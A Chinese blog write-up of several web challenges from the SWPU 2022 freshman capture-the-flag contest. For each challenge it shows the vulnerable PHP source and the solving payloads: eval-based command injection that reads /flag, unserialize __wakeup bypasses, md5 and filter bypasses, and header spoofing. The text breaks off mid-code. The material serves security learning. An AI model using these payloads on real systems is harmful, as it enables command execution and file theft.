---
layout: post
title: "SWPU-2022-新生赛"
date: 2025-03-14 21:27:12 +0800
description: "既然 get 参数的值存在限制，那么我们可以将 get 的值设置为 eval($_GET[‘?目的是调用最内层的 Fileview 进行文件读取，当最内层的 Fileview local 被 wakeup 覆盖后，外层 Backdoor 反序列会将其覆盖回来。Referer:它的作用是指示一个请求是从哪里链接过来，那么当一个请求并不是由链接触发产生的，那么自然也就不需要指定这个请求的链接来源。FV是Backdoor的对象，根本没有这个方法，所以会报错。比如，类1包含类2，那么他会先反序列化类2，再类1."
keywords: "SWPU 2022 新生赛"
categories: ['The', 'Flag', 'Capture']
tags: ['Web']
artid: "146267677"
image:
    path: https://api.vvhan.com/api/bing?rand=sj&artid=146267677
    alt: "SWPU-2022-新生赛"
render_with_liquid: false
featuredImage: https://bing.ee123.net/img/rand?artid=146267677
featuredImagePreview: https://bing.ee123.net/img/rand?artid=146267677
cover: https://bing.ee123.net/img/rand?artid=146267677
image: https://bing.ee123.net/img/rand?artid=146267677
img: https://bing.ee123.net/img/rand?artid=146267677
---

<div class="blog-content-box">
 <div class="article-header-box">
  <div class="article-header">
   <div class="article-title-box">
    <h1 class="title-article" id="articleContentId">
     SWPU 2022 新生赛
    </h1>
   </div>
  </div>
 </div>
 <article class="baidu_pl">
  <div class="article_content clearfix" id="article_content">
   <link href="../../assets/css/kdoc_html_views-1a98987dfd.css" rel="stylesheet"/>
   <link href="../../assets/css/ck_htmledit_views-704d5b9767.css" rel="stylesheet"/>
   <div class="markdown_views prism-atom-one-dark" id="content_views">
    <svg style="display: none;" xmlns="http://www.w3.org/2000/svg">
     <path d="M5,0 0,2.5 5,5z" id="raphael-marker-block" stroke-linecap="round" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);">
     </path>
    </svg>
    <h2>
     <a id="webdog1__start_0">
     </a>
     webdog1__start
    </h2>
    <pre><code class="prism language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'web'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
    <span class="token variable">$first</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'web'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$first</span><span class="token operator">==</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$first</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 
</code></pre>
    <h3>
     <a id="md5__9">
     </a>
     md5 自等
    </h3>
    <p>
     web=0e215962017 （md5后也是 0e)
    </p>
    <p>
     登入后得到提示，robots.txt
    </p>
    <p>
     访问 f14g.php
    </p>
    <p>
     返回包里发现 hint
    </p>
    <p>
     ==&gt;
    </p>
    <pre><code class="prism language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'get'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token variable">$get</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'get'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$get</span><span class="token punctuation">,</span><span class="token string double-quoted-string">" "</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token variable">$get</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">" "</span><span class="token punctuation">,</span> <span class="token variable">$get</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$get</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"This is too long."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            
            <span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
                <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$get</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">}</span> 
    <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nonono"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>
</code></pre>
    <pre><code>strstr 是 PHP 中的一个字符串处理函数，用于查找字符串中首次出现某个子字符串的位置，并返回从该子字符串开始到字符串末尾的部分。如果未找到子字符串，则返回 false
</code></pre>
    <p>
     不能有空格，flag，长度不大于 18
    </p>
    <pre><code>?get=system(phpinfo());
?get=system(ls);
</code></pre>
    <pre><code>?get=system(%27nl%09/*%27);				//%27不能掉
</code></pre>
    <p>
     %09 为制表符
    </p>
    <p>
     其他姿势1
    </p>
    <p>
     嵌套 eval()
     <br/>
     既然 get 参数的值存在限制，那么我们可以将 get 的值设置为 eval($_GET[‘?’]); （理论上，? 可以表示任何文本）来接收另一个参数名为 ? 的值并将其作为 PHP 代码执行。这样，判断语句将检查 get 参数，而实际起破坏作用的代码却被我们转移到了另一个参数 ? 中。对此，构造如下查询字符串：
    </p>
    <p>
     原文链接：https://blog.csdn.net/qq_44879989/article/details/131429635
    </p>
    <pre><code>?get=eval($_GET['x']);&amp;x=system('cat /flag');
</code></pre>
    <p>
     其他姿势2
    </p>
    <p>
     由于 flag 被替换为空格，所以可以使用 flag 当空格用
    </p>
    <pre><code>?get=system('catflag/*')
</code></pre>
    <p>
     读到 flag.php 后查看源码，得到 /flag
    </p>
    <h3>
     <a id="_79">
     </a>
     跳板命令绕过，借力打力
    </h3>
    <h2>
     <a id="ez_ez_php_81">
     </a>
     ez_ez_php
    </h2>
    <pre><code class="prism language-php"><span class="token comment">//输出：O:2:"lt":3:{s:4:"impo";O:3:"fin":3:{s:1:"a";s:6:"system";s:3:"url";s:21:"https://www.ctfer.vip";s:5:"title";s:9:"cat /flag";}s:4:"md51";s:11:"s155964671a";s:4:"md52";s:11:"s214587387a";}</span>
</code></pre>
    <p>
     增加属性值绕过 wakeup
    </p>
    <pre><code>O:2:"lt":5:{s:4:"impo";O:3:"fin":3:{s:1:"a";s:6:"system";s:3:"url";s:21:"https://www.ctfer.vip";s:5:"title";s:9:"cat /flag";}s:4:"md51";s:11:"s155964671a";s:4:"md52";s:11:"s214587387a";}
</code></pre>
    <h2>
     <a id="js_sign_95">
     </a>
     js_sign
    </h2>
    <p>
     开发者工具的 source 一栏里找到 man.js
    </p>
    <pre><code class="prism language-js">document<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">"button"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">"click"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{<!-- --></span>
    flag<span class="token operator">=</span><span class="token string">"33 43 43 13 44 21 54 34 45 21 24 33 14 21 31 11 22 12 54 44 11 35 13 34 14 15"</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">btoa</span><span class="token punctuation">(</span>flag<span class="token punctuation">.</span>value<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'dGFwY29kZQ=='</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"you got hint!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
        <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"fuck off !!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>    
<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre>
    <p>
     dGFwY29kZQ==
    </p>
    <p>
     解码 ==&gt; tapcode
    </p>
    <p>
     搜一下这个 tapcode
    </p>
    <p>
     ==&gt;
    </p>
    <p>
     滴答码，有时也称为敲击码，是一种以非常简单的方式逐字母编码文本消息的方法。消息通过一系列敲击声来传输，因此得名。 [
     <a href="https://en.wikipedia.org/wiki/Tap_code#cite_note-1" rel="nofollow">
      1]
     </a>
    </p>
    <p>
     搜在线网站解码，但格式有问题，试着将上面的数字全部分隔开然后敲击，有意外的发现
    </p>
    <p>
     [滴答码][https://cryptii.com/pipes/tap-code]
    </p>
    <p>
     编写python脚本自动化打点
    </p>
    <pre><code class="prism language-py"><span class="token keyword">import</span> re

flag <span class="token operator">=</span> <span class="token string">"33 43 43 13 44 21 54 34 45 21 24 33 14 21 31 11 22 12 54 44 11 35 13 34 14 15"</span>
patter <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'\d'</span><span class="token punctuation">)</span>
num <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>patter<span class="token punctuation">,</span> flag<span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> num<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">*</span><span class="token string">"."</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">' '</span><span class="token punctuation">)</span>
</code></pre>
    <p>
     exp
    </p>
    <pre><code>... ... .... ... .... ... . ... .... .... .. . ..... .... ... .... .... ..... .. . .. .... ... ... . .... .. . ... . . . .. .. . .. ..... .... .... .... . . ... ..... . ... ... .... . .... . ..... 
</code></pre>
    <p>
     ==&gt;
    </p>
    <p>
     nssctfyoufindflagbytapcode
    </p>
    <p>
     ==&gt;
    </p>
    <p>
     NSSCTF{youfindflagbytapcode}
    </p>
    <h2>
     <a id="xff_150">
     </a>
     xff
    </h2>
    <p>
     我是本地人
    </p>
    <p>
     Must be jump from Home Page.
    </p>
    <p>
     Must be accessed from Xiaohong’s own computer.
    </p>
    <p>
     抓包添加 header
    </p>
    <pre><code>X-Forwarded-For:127.0.0.1
Referer:127.0.0.1
</code></pre>
    <p>
     XFF:告诉服务器当前请求者的最终IP。在一些情况下，攻击者可能会尝试伪造X-Forwarded-For字段来隐藏其真实IP地址，因此在使用XFF时需要谨慎验证其真实性。
    </p>
    <p>
     Referer:它的作用是指示一个请求是从哪里链接过来，那么当一个请求并不是由链接触发产生的，那么自然也就不需要指定这个请求的链接来源。
    </p>
    <h2>
     <a id="funny_php_169">
     </a>
     funny_php
    </h2>
    <pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token number">3</span><span class="token operator">&amp;&amp;</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token operator">&gt;</span><span class="token number">999999999</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">":D"</span><span class="token punctuation">;</span>
            <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'L1'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">":C"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/NSSCTF/'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$str</span> <span class="token operator">===</span> <span class="token string double-quoted-string">"NSSCTF"</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"wow"</span><span class="token punctuation">;</span>
            <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'L2'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
            <span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'md5_1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'md5_2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'md5_1'</span><span class="token punctuation">]</span><span class="token operator">!==</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'md5_2'</span><span class="token punctuation">]</span><span class="token operator">&amp;&amp;</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'md5_1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'md5_2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Nice!"</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'md5_1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'md5_2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'md5_1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'md5_2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
                    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"yoxi!"</span><span class="token punctuation">;</span>
                    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'L3'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
                    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"X("</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"G"</span><span class="token punctuation">;</span>
            <span class="token keyword">echo</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'md5_1'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token operator">.</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'md5_2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'L1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'L2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'L3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

  
</code></pre>
    <ul>
     <li>
      科学计数法绕过
     </li>
     <li>
      双写绕过
     </li>
     <li>
      md5绕过
     </li>
    </ul>
    <p>
     exp
    </p>
    <pre><code>?num=1e9&amp;str=NSSNSSCTFCTF

POST
md5_1=s878926199a&amp;md5_2=s214587387a
</code></pre>
    <h2>
     <a id="ez_ez_unserialize_233">
     </a>
     ez_ez_unserialize
    </h2>
    <pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">X</span>
<span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$x</span> <span class="token operator">=</span> <span class="token constant">__FILE__</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">x</span> <span class="token operator">!==</span> <span class="token constant">__FILE__</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">x</span> <span class="token operator">=</span> <span class="token constant">__FILE__</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">x</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//flag is in fllllllag.php</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'x'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    @<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'x'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
    <p>
     简单绕过一下 wakep 即可
    </p>
    <pre><code class="prism language-py"><span class="token operator">&lt;</span>?php
<span class="token keyword">class</span> <span class="token class-name">X</span>
<span class="token punctuation">{<!-- --></span>
    public $x <span class="token operator">=</span> __FILE__<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
$x <span class="token operator">=</span> new x<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
$x <span class="token operator">-</span><span class="token operator">&gt;</span> x <span class="token operator">=</span> <span class="token string">"fllllllag.php"</span><span class="token punctuation">;</span>
<span class="token operator">//</span>echo serialize<span class="token punctuation">(</span>$x<span class="token punctuation">)</span><span class="token punctuation">;</span>
$exp <span class="token operator">=</span><span class="token string">'O:1:"X":4:{s:1:"x";s:13:"fllllllag.php";}'</span><span class="token punctuation">;</span>
echo urldecode<span class="token punctuation">(</span>$exp<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">//</span>O<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">"X"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">{<!-- --></span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">"x"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">13</span><span class="token punctuation">:</span><span class="token string">"fllllllag.php"</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
</code></pre>
    <h2>
     <a id="Power_277">
     </a>
     Power!
    </h2>
    <p>
     随便测试一下
    </p>
    <p>
     ?image_path=1
    </p>
    <p>
     file_get_contents(1): failed to open stream: No such file or directory in
     <strong>
      /var/www/html/index.php
     </strong>
     on line
     <strong>
      66
     </strong>
    </p>
    <pre><code>php://filter/read=convert.base64-encode/resource=flag.php    
</code></pre>
    <pre><code>php:    被过滤
</code></pre>
    <p>
     再尝试一下其他的
    </p>
    <p>
     直接 ?image_path=flag.php
    </p>
    <p>
     看到一个未加载的图片，查看源码有一个 base64 的 source
    </p>
    <pre><code class="prism language-py"><span class="token operator">&lt;</span>?php

$a <span class="token operator">=</span> "good job<span class="token punctuation">,</span>but there <span class="token keyword">is</span> no flag

i put my flag <span class="token keyword">in</span> intranet<span class="token punctuation">(</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token number">65500</span><span class="token punctuation">)</span>

outsider have no permissions to get it

<span class="token keyword">if</span> you want it<span class="token punctuation">,</span>then you have to take it

but you already knew the rules

<span class="token keyword">try</span> it"<span class="token punctuation">;</span>

?<span class="token operator">&gt;</span>
</code></pre>
    <p>
     intranet:局域网
    </p>
    <p>
     这里有点模糊，直接读一下 index.php
    </p>
    <pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token keyword">class</span> <span class="token class-name-definition class-name">FileViewer</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">public</span> <span class="token variable">$black_list</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"flag"</span><span class="token punctuation">;</span>
        <span class="token keyword">public</span> <span class="token variable">$local</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"http://127.0.0.1/"</span><span class="token punctuation">;</span>
        <span class="token keyword">public</span> <span class="token variable">$path</span><span class="token punctuation">;</span>
        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">loadfile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">loadfile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/"</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">black_list</span><span class="token operator">.</span><span class="token string double-quoted-string">"/i"</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
                    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">curl</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">local</span><span class="token operator">.</span><span class="token string double-quoted-string">"cheems.jpg"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
                    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">curl</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">local</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
                <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">curl</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">local</span><span class="token operator">.</span><span class="token string double-quoted-string">"cheems.jpg"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;img src="data:jpg;base64,'</span><span class="token operator">.</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'"/&gt;'</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">curl</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
            <span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$path</span><span class="token punctuation">;</span>
            <span class="token variable">$curl</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curl</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
